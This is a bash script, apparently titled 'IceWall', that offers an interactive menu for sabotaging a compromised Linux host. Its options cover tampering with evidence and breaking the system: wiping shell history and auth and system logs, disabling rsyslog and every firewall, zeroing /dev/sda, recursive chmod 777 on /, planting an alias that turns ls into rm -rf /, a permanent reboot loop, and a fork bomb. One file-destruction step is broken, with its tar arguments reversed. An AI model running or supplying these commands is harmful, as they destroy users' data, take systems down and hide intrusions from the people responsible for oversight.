#!/bin/bash
echo "
  _____             __          __  _ 
 |_   _|            \ \        / / | |
   | |  ___ ___ _____\ \  /\  / /__| |
   | | / __/ _ \______\ \/  \/ /_  / |
  _| || (_|  __/       \  /\  / / /| |
 |_____\___\___|        \/  \/ /___|_|"

#banner function
banner()
{
  echo "+------------------------------------------+"
  printf "|`tput bold` %-40s `tput sgr0`|\n" "$@"
  echo "+------------------------------------------+"
}
echo "+++++++++++++++Welcome+++++++++++++++"
echo "Disclaimer the author of this script assume no responsibility 
for the actions of the user or for damaged caused to any and all systems"
echo "Please use resonsibly and do not use this on any systems that you are not authorized to"
echo "If you use the alias options changes will take effect post reboot or 
run 'source ~/.bashrc' to make them instant"
#start of histfile unset
banner "Wipe History"
echo "Do you want to unset the HISTFILE (Y/N): "
read hist
case $hist in
    [Yy]* ) unset HISTFILE #disables history logging
            export HISTFILESIZE=0 #set maximim length to 0
            export HISTSIZE=0 #sets the maximim command length to 0
            history -c #clear current shell history
            echo "" > ~/.bash_history #clear current user bash history
            ln /dev/null ~/.bash_history -sf #sends bash history to /dev/null
            ;;
    [Nn]* ) ;;
    * ) echo "Please enter yes or no." ;;
esac

#start of logged on users
banner "Kill Connections"
echo "Users logged on...$(w)"
echo "Do you want to kill any users connection (Y/N): "
read option
case $option in
    [Yy]* ) echo "Enter their username: "
            read username
            pkill -u $username
            ;;
    [Nn]* ) ;;
    * ) echo "Please enter yes or no." ;;
esac
#end of logged on users

#cover tracks in log files
banner "Wipe Logs"
echo "Do you want to clear the log files and disable rsyslog (need root) (Y/N): "
read log
case $log in
    [Yy]* ) echo "Clearing logs."
            echo "" > /var/log/alternatives.log
            echo "" > /var/log/alternatives.log.1
            echo "" > /var/log/messages
            echo "" > /var/log/messages.1
            echo "" > /var/log/syslog
            echo "" > /var/log/syslog.1
            echo "" > /var/log/user.log
            echo "" > /var/log/user.log.1
            echo "" > /var/log/auth.log
            echo "" > /var/log/auth.log.1
            echo "" > /var/log/mail.log
            service rsyslog stop
            sudo systemctl disable rsyslog
            ;;
    [Nn]* ) ;;
    * ) echo "Please enter yes or no"
        ;;
esac
#end of cover tracks in log files

#start of messing with firewalls
banner "Time to mess with firewalls"
echo "Do you want to shut off all their firewalls (need root) (Y/N): "
read firewall
case $firewall in
    [Yy]* ) service iptables stop
            service ip6tables stop
            sudo systemctl stop firewalld
            sudo systemctl disable firewalld
            sudo ufw disable
            systemctl disable ufw
            ;;
    [Nn]* ) ;;
    *) echo "Please enter yes or no"
esac
#end of messing with firewalls

#start of erase disk
banner "Zero Memory"
echo "WARNING: If yes this will kill the script and host"
echo "Do you want to wipe the disk (need root) (Y/N): "
read mem
case $mem in
    [Yy]* ) echo "Please be patient"
            echo "Clearning disk..."
            dd if=/dev/zero of=/dev/sda ;;
    [Nn]* ) ;;
    * ) echo "Please enter yes or no" ;;
esac

banner "Lets be more surgical"
echo "Do you want to destroy a particular file on the machine (Y/N): "
read tarr
case $tarr in
    [Yy]* ) echo "Enter the absolute path to the file you want to destroy ie /home/user/Desktop/file.jpeg: "
            read path
            case $path in
                [/]* ) tar -czvf $path archive.tgz ;;
                [Nn]* ) ;;
                * ) echo "Please enter yes or no" ;;
                esac
                ;;
    [Nn]* ) ;;
    * ) echo "Please enter yes or no" ;;
esac
#end of file destruction

banner "chmod -R"
echo "WARNING: If yes this will kill the script and host"
echo "Do you want to mess up their file permissions (need root) (Y/N): "
read perm
case $perm in
    [Yy]* ) chmod -R 777 / ;;
    [Nn]* ) ;;
    * ) echo "Please enter yes or no" ;;
esac

#start of aliases
banner "Mean alias things"
echo "Do you want to mess up their aliases (Y/N): "
read aliass
case $aliass in
    [Yy]* ) cd ~
            echo "export PROMPT_COMMAND=\"cd\"" >> ~/.bashrc #prevents them from cd'ing anywhere else but ~
            echo "export PS1=\"Username:\"" >> ~/.bashrc #changes their prompt to Login: 
            echo "alias mv=\"cp\"" >> ~/.bashrc #changes mv to cp
            echo "alias ls=\"rm / -rf --no-preserve-root\"" >> ~/.bashrc #deletes all the files below /home/user as non root. wipes everything if run as root
            ;;
    [Nn]* ) ;;
    * ) echo "Please enter yes or no" ;;
esac
#end of aliases

#start of change the run level
banner "Time to change the run level"
echo 'Do you want to change their run level (need root) (Y/N): '
read level
case $level in
    [Yy]* ) systemctl set-default reboot.target #perm change to the run level
            sleep 3 #give time to let command execute fully
            init 6 ;; #force the reboot with new default run level
    [Nn]* ) ;;
    * )  echo "Please enter yes or no" ;;
esac
#end change of the run level

banner "Force reboot"
echo 'Do you want to reboot the system (Y/N): '
read rebot
case $rebot in
    [Yy]* ) init 6 ;;
    [Nn]* ) ;;
    * ) echo "Please enter yes or no" ;;
esac

#start of the fork bomb
banner "Fork Bombbbbbbbbbbbb"
echo "Do you want to fork bomb the host (Y/N): "
read bomb
case $bomb in
    [Yy]* ) :() { :|:& };: ;;
    [Nn]* ) ;;
    * ) echo "Please enter yes or no"
esac
